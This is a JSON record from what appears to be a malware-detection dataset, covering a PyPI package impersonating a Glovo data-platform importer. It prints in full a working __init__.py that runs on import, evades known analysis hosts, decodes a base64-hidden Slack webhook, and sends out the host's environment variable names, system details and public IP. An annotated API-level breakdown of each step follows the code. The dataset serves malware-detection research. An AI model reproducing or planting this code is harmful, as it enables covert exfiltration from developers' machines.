{
  "metadata": {
    "package_name": "glovo-data-platform-importer-brain-999.9.20",
    "report_path": "/home2/blue/Documents/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/glovo-data-platform-importer-brain-999.9.20.txt",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/malware/glovo-data-platform-importer-brain-999.9.20.json",
    "dataset_type": "malware"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "code_snippets": [
        {
          "snippet": "import os\nimport json\nimport traceback\nimport base64\nfrom urllib import request\n\ndef save_some_stuff():\n    known_bots_nodename = [\"lili-pc\"]\n    known_bots_programs = [\"analyze-python.py\", \"detect.py\"]\n    try:\n        if os.uname().nodename in known_bots_nodename:\n            return\n        if traceback.extract_stack()[0].filename.split(\"/\")[-1] in known_bots_programs:\n            return\n        _save_some_stuff()\n    except:\n        return\n    \ndef _save_some_stuff():\n    url = (\"aHR0cHM6Ly9ob29rcy5zbGF\"\n           \"jay5jb20vc2VydmljZXMvVDAzRjRCV\"\n           \"FNLL0IwNktYVVI5RDJBL05mcUdqT1E3SGxTZ\"\n           \"0sxenZHSEJvbXdCMQ==\")\n    url = base64.b64decode(url).decode('utf-8')\n    data = (\n        \"============================================\\n\"\n        f\"\\t stack={traceback.extract_stack()}\\n\\n\"\n        f\"\\t env={dict(os.environ).keys()}\\n\\n\"\n        f\"\\t uname={os.uname()}\\n\\n\"\n        f\"\\t ip={request.urlopen('https://ipinfo.io/ip').read().decode('utf8')}\"\n    )\n    body = {\"text\": data}\n    data = json.dumps(body)\n    data = data.encode()\n    req =  request.Request(url)\n    req.add_header('Content-Type', 'application/json')\n    request.urlopen(req, data=data)\n\nsave_some_stuff()",
          "triple_sequences": [
            {
              "action_api": "os.uname()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "traceback.extract_stack()",
              "action_description": "Extracts current call stack as FrameSummary objects",
              "action_id": "extract_call_stack",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "aHR0cHM6Ly9ob29rcy5zbGFjay5jb20vc2VydmljZXMvVDAzRjRCVFNLL0IwNktYVVI5RDJBL05mcUdqT1E3SGxTZ0sxenZHSEJvbXdCMQ==",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "'utf-8'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "os.environ",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "request.urlopen()",
              "action_description": "Opens URL with GET parameters",
              "action_id": "open_url_get",
              "object": "https://ipinfo.io/ip",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Collect public IP address",
              "intention_id": "collect_public_ip"
            },
            {
              "action_api": "read()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare data for further processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "str.decode()",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "'utf8'",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Prepare string for execution",
              "intention_id": "prepare_string_execution"
            },
            {
              "action_api": "json.dumps()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "body",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Serialize data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "request.Request()",
              "action_description": "Creates HTTP request object with specified URL, data, and headers",
              "action_id": "create_http_request",
              "object": "url",
              "object_description": "URL string",
              "object_id": "url_string",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "req.add_header()",
              "action_description": "Adds HTTP header to request object",
              "action_id": "add_http_header",
              "object": "'Content-Type', 'application/json'",
              "object_description": "HTTP header",
              "object_id": "http_header",
              "intention_description": "Prepare URL for HTTP request",
              "intention_id": "prepare_url_http_request"
            },
            {
              "action_api": "request.urlopen()",
              "action_description": "Opens URL with POST data",
              "action_id": "open_url_post",
              "object": "req, data=data",
              "object_description": "Request object for external domain",
              "object_id": "request_external_domain",
              "intention_description": "Transmit encoded data via HTTP POST",
              "intention_id": "transmit_data_http_post"
            }
          ]
        }
      ]
    }
  ]
}